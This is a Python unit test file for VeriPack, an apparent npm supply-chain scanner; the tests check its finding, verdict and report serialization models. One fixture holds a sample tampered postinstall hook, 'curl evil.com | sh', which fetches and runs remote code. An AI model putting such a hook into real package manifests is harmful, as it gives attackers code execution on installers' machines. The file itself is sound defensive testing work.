"""
Unit tests validating VeriPack domain models, report serialization, and verdicts.
"""

import json
from pathlib import Path
from veripack import __version__, __author__
from veripack.models import (
    Verdict,
    FileStatus,
    Severity,
    Archetype,
    Finding,
    PackageMetadata,
    SourceMetadata,
    ScanReport,
)


def test_package_metadata():
    """Verify package metadata exposes semantic version and author attribution."""
    assert __version__ == "0.1.0"
    assert "Pratyancha" in __author__


def test_models_and_verdicts():
    """Verify models correctly map and represent all 3 evaluation archetypes."""
    # Case 1: Expected build artifact
    f1 = Finding(
        file_path="dist/index.js",
        classification=FileStatus.EXPECTED_BUILD_ARTIFACT,
        severity=Severity.INFO,
        archetype=Archetype.CASE_1_EXPECTED_BUILD,
        evidence=["Maps to src/index.ts", "Exported symbols match"],
        explanation="Standard TypeScript compiler bundle; recognized as expected artifact.",
    )
    assert f1.classification == FileStatus.EXPECTED_BUILD_ARTIFACT
    assert f1.archetype == Archetype.CASE_1_EXPECTED_BUILD

    # Case 2: Manifest tampering (e.g. injected postinstall hook)
    f2 = Finding(
        file_path="package.json",
        classification=FileStatus.SUSPICIOUS_MANIFEST,
        severity=Severity.HIGH,
        archetype=Archetype.CASE_2_MANIFEST_TAMPERING,
        evidence=["Added scripts.postinstall"],
        diff_snippet='+ "postinstall": "curl evil.com | sh"',
        explanation="Added 'postinstall: curl evil.com | sh' not present in upstream Git tag.",
    )
    assert f2.classification == FileStatus.SUSPICIOUS_MANIFEST
    assert f2.severity == Severity.HIGH

    # Case 3: Ghost obfuscated file (phantom file with high entropy)
    f3 = Finding(
        file_path="lib/x.min.js",
        classification=FileStatus.UNMAPPED_GHOST_FILE,
        severity=Severity.CRITICAL,
        archetype=Archetype.CASE_3_GHOST_OBFUSCATED,
        entropy=6.84,
        evidence=["High entropy 6.84", "Obfuscation: eval, _0x hex"],
        explanation="High Shannon entropy and hex payload markers; phantom injection.",
    )
    assert f3.classification == FileStatus.UNMAPPED_GHOST_FILE
    assert f3.severity == Severity.CRITICAL


def test_scan_report_serialization():
    """Verify complete scan report serialization to dictionary and JSON format."""
    report = ScanReport(
        package_name="express",
        version="4.21.2",
        ecosystem="npm",
        source_ref="v4.21.2",
        archive_sha256="abc123sha256",
        provenance_verified=True,
        summary_counts={
            "identical": 20,
            "expected_artifacts": 2,
            "stripped_dev_files": 5,
            "suspicious": 0,
            "critical": 0,
        },
        verdict=Verdict.SAFE,
        model_used="qwen2.5-coder:7b (ollama)",
    )

    data = report.to_dict()
    assert data["package_name"] == "express"
    assert data["verdict"] == "SAFE"
    assert data["provenance_verified"] is True
    assert data["model_used"] == "qwen2.5-coder:7b (ollama)"

    json_str = json.dumps(data)
    assert "express" in json_str
    assert "SAFE" in json_str


def test_package_and_source_metadata():
    """Verify PackageMetadata and SourceMetadata serialization."""
    pkg = PackageMetadata(
        name="demo",
        version="1.0.0",
        ecosystem="npm",
        archive_path=Path("/tmp/demo-1.0.0.tgz"),
        extracted_path=Path("/tmp/demo_extracted"),
        sha256="dummy_hash",
        has_provenance=True,
    )
    src = SourceMetadata(
        source_path=Path("/tmp/demo_source"),
        ref_matched="v1.0.0",
        exact_version_matched=True,
    )

    pkg_dict = pkg.to_dict()
    assert pkg_dict["name"] == "demo"
    assert "/tmp/demo-1.0.0.tgz" in pkg_dict["archive_path"]

    src_dict = src.to_dict()
    assert src_dict["ref_matched"] == "v1.0.0"
